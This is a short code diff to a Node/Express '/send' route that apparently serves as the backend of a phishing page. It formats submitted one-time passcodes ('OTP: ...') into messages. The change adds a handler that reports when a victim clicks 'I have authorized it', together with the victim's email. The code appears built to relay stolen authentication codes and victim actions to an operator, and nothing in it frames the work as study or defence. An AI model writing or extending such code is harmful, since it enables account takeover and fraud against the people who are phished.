@@ -50,8 +50,9 @@ app.post('/send', (req, res) => {
     else if (data.type === 'otp') {
         message = `OTP: ${data.otp}`;
     } 
-    else if (data.type === 'auth') {
-        message = `"I have authorized"`;
+    // This matches the finalConfirm() function in your HTML
+    else if (data.type === 'final_click') {
+        message = `✅ "I have authorized it" clicked for: ${data.email}`;
     }
 
     if (message) {
